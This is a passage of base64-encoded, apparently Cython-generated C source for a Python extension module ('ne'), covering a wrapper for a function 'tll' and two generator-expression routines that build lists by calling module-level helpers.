JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpIHsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInRsbCAod3JhcHBlcikiLCAwKTsKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ybmVfMnRsbChfX3B5eF9zZWxmKTsKCiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybmVfM3RsbF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfM3RsbF9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApOwogIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUpKSB7CiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKVB5X05vbmUpOwogICAgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogICAgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJuZV8zdGxsXzJnZW5lcmF0b3IsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsX2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmUpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7CiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuOwogIH0KCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUudGxsLmdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybmVfM3RsbF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpIAp7CiAgc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5X3NzaXplX3QgX19weXhfdF8yOwogIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfODsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBzd2l0Y2ggKF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsKSB7CiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuOwogICAgZGVmYXVsdDogCiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiBOVUxMOwogIH0KICBfX3B5eF9MM19maXJzdF9ydW46OwogIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfcik7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKSB9CiAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB8fCBQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgewogICAgX19weXhfdF8xID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wOyBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTsKICAgIF9fcHl4X3RfMiA9IDA7CiAgICBfX3B5eF90XzMgPSBOVUxMOwogIH0gZWxzZSB7CiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBmb3IgKDs7KSB7CiAgICBpZiAobGlrZWx5KCFfX3B5eF90XzMpKSB7CiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfSBlbHNlIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7CiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfQogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogICAgfSBlbHNlIHsKICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgewogICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7CiAgICAgICAgaWYgKGV4Y190eXBlKSB7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICB9CiAgICB9CiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2kpOwogICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7CiAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX3B5eF90XzQgPSAwOwogICAgX19weXhfdF81ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgX19weXhfdF84ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpOwogICAgICBhc3NlcnQoX19weXhfdF81KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzggPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgfQogICAgaWYgKHVubGlrZWx5KF9fUHl4X0xpc3RDb21wX0FwcGVuZChfX3B5eF9yLCAoUHlPYmplY3QqKV9fcHl4X3RfNCkpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpOwoKICAKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOyBfX3B5eF9yID0gMDsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOwogIGlmIChfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7CiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApOwogICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgfQogIF9fcHl4X0wwOjsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICAjaWYgIUNZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpOwogICNlbmRpZgogIF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsID0gLTE7CiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJuZV8zdGxsXzVnZW5lcmF0b3IxKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfM3RsbF8zZ2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkgewogIHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHsKICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKVB5X05vbmUpOwogICAgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogICAgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJuZV8zdGxsXzVnZW5lcmF0b3IxLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMV0pLCAoUHlPYmplY3QgKikgX19weXhfY3VyX3Njb3BlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RsbF9sb2NhbHNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25lKTsgaWYgKHVubGlrZWx5KCFnZW4pKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF9jdXJfc2NvcGUpOwogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gKFB5T2JqZWN0ICopIGdlbjsKICB9CgogIAogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMm5lXzN0bGxfNWdlbmVyYXRvcjEoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgCnsKICBzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilfX3B5eF9nZW5lcmF0b3ItPmNsb3N1cmUpOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMjsKICBQeU9iamVjdCAqKCpfX3B5eF90XzMpKFB5T2JqZWN0ICopOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90Xzg7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkgewogICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjsKICAgIGRlZmF1bHQ6IAogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gTlVMTDsKICB9CiAgX19weXhfTDNfZmlyc3RfcnVuOjsKICBpZiAodW5saWtlbHkoIV9fcHl4X3NlbnRfdmFsdWUpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3IpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgeyBfX1B5eF9SYWlzZVVuYm91bmRMb2NhbEVycm9yKCIuMCIpOyBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikgfQogIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsKICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMDsgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIgPSAwOwogICAgX19weXhfdF8zID0gTlVMTDsKICB9IGVsc2UgewogICAgX19weXhfdF8yID0gLTE7IF9fcHl4X3RfMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF8zID0gKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpID8gUHlJdGVyX05leHQgOiBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgZm9yICg7OykgewogICAgaWYgKGxpa2VseSghX19weXhfdF8zKSkgewogICAgICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfMSkpKSB7CiAgICAgICAgewogICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlMaXN0X0dFVF9TSVpFKF9fcHl4X3RfMSk7CiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihfX3B5eF90XzEsIF9fcHl4X3RfMik7CiAgICAgICAgKytfX3B5eF90XzI7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgewogICAgICAgICAg